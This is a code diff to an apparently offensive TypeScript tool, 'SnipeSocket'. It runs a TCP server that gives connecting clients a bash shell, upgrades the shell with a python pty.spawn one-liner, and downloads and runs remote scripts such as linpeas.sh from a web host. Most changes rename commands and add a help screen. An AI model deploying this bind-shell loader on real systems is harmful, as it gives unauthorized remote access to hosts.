@@ -107,7 +107,7 @@ const PROMPT_PREFIX = colors.reset('💀 ')
 const DEFAULT_PROMPT = colors['prompt']('f11>') + colors.reset(' ');
 let PROMPT = PROMPT_PREFIX + DEFAULT_PROMPT;
 const NEWLINE = `\r\n`;
-const PORT = 7070;
+const PORT = 1337;
 const HOST = '0.0.0.0';
 const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
 // Create net tcp server
@@ -278,6 +278,8 @@ class SnipeSocket {
     this.sock.write(NEWLINE);
     this.sock.write(colors['info'](`Type: "run" to execute ${target}`));
     this.sock.write(NEWLINE);
+    this.sock.write(colors['info'](`Type: "get" to download (or update) ${target}`));
+    this.sock.write(NEWLINE);
     this.sock.write(colors['info'](`Type: "exit" or "stop" anytime to return to F11 shell`));
     this.sock.write(NEWLINE);
     this.prompt();
@@ -336,25 +338,21 @@ class SnipeSocket {
     this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
-  public welcome(art = 'welcome.txt'): void {
-    const banner = path.join(__dirname, '../assets', art);
-    // let banner = 'assets/welcome.txt';
-    let body = 'Welcome to SnipeSocket!';
+  public ascii(art = 'welcome.txt', color = 'blue'): void {
+    const banner = path.join(__dirname, '../art', art);
+    let body = `Load ascii: ${art}`;
 
     try {
       msg('debug', `Loading asset: ${banner}`);
 
-      body = colors.blue(require(banner));
-      msg('info', `[PKG] Read banner: ${body}`);
+      body = colors[color](require(banner));
     } catch (err) {
       if (fs.existsSync(banner)) {
-        body = colors.blue(fs.readFileSync(banner).toString());
-        msg('info', `[F11] Read banner: ${body}`);
+        body = colors[color](fs.readFileSync(banner).toString());
       } else {
         console.log(err);
         msg('warn', `Caught error reading msg text files, falling back`);
-        body = colors.blue(body);
-        // this.sock.write('Welcome!');
+        body = colors[color](body);
       }
     }
 
@@ -420,8 +418,10 @@ class SnipeSocket {
 
     if (this.inShell) return;
 
-    if (/^w?get|add|download$/i.test(cmd)) {
-      const doShit = () => {
+    if (/^\?|help|how|man|wtf|fuck$/i.test(cmd)) {
+      this.ascii('help.txt', 'cyan');
+    } else if (/^w?get|add|download$/i.test(cmd)) {
+      if (this.loaded || args.length > 0) {
         const name = this.loaded?.name || args[0];
         const file = `${TMP_DIR}/${name}`;
         const url = args[1] || this.loaded?.href || `${WEB_HOST}/${name}`;
@@ -445,17 +445,12 @@ class SnipeSocket {
           this.load(name);
           this.prompt();
         });
-      };
-
-      if (this.loaded || args.length > 0) {
-        doShit();
       } else {
-        // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
-        this.sock.write(colors['warn'](`Usage: get <file> [<url>] [<details>]`));
+        this.sock.write(colors['warn'](`Usage: get <module> [<url>] [<details>]`));
         this.prompt();
       }
     } else if (this.loaded) {
-      if (/^run$/i.test(cmd)) {
+      if (/^ya|run|doit|exec(ute)?$/i.test(cmd)) {
         if (this.loaded?.path && fs.existsSync(this.loaded?.path)) {
           this.run(this.loaded.path);
         } else if (this.loaded?.path) {
@@ -468,7 +463,7 @@ class SnipeSocket {
           this.sock.write(colors['warn'](`Unknow action: ${data}`));
           this.prompt();
         }
-      } else if (/^stop|kill|back|exit$/i.test(cmd)) {
+      } else if (/^stop|kill|back|exit|quit$/i.test(cmd)) {
         this.cp?.kill();
         this.reset();
       } else if (cmd) {
@@ -477,19 +472,24 @@ class SnipeSocket {
       } else {
         this.prompt();
       }
-    } else if (/^sh|bash|shell$/i.test(cmd)) {
+    } else if (/^stop|kill|back|exit|quit$/i.test(cmd)) {
+      this.sock.write(colors['warn'](`Goodbye`));
+      this.sock.write(NEWLINE);
+      this.sock.removeAllListeners();
+      this.sock.end();
+    } else if (/^sh|cmd|bash|shell|lemmein$/i.test(cmd)) {
       this.shell();
     } else if (Object.keys(LOAD_MAP).includes(cmd)) {
       this.load(cmd);
-    } else if (/^use|load$/i.test(cmd)) {
+    } else if (/^use|load|pick|gimme$/i.test(cmd)) {
       if (!args[0]) {
-        this.sock.write(colors.red(`Missing module: "use|load <module>"`));
+        this.sock.write(colors['warn'](`Usage: use <module>`));
         this.prompt();
       } else {
         this.load(args[0]);
       }
     } else {
-      if (cmd.trim() && !/^ls|list|show/i.test(cmd)) {
+      if (cmd.trim() && !/^ls|list|show|modules/i.test(cmd)) {
         this.sock.write(NEWLINE);
         this.sock.write(colors['prompt'](`Unknown cmd: ${cmd}`));
         this.sock.write(NEWLINE);
@@ -521,11 +521,6 @@ server.listen(PORT, HOST, () => {
   msg('good', `SHELL: ${findShell()}`)
 });
 
-// console.log('process.__nexe', process['__nexe']);
-// console.log('process.env', process['env']);
-// console.log('process.args', process.argv.join(' '));
-// console.log('getSystemInfo()', getSystemInfo());
-
 // Main handler for new connections
 server.on('connection', (sock: net.Socket) => {
   const socket = new SnipeSocket(sock);
@@ -535,7 +530,7 @@ server.on('connection', (sock: net.Socket) => {
 
   try {
     socket.reset(false);
-    socket.welcome('welcome.txt');
+    socket.ascii('welcome.txt');
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
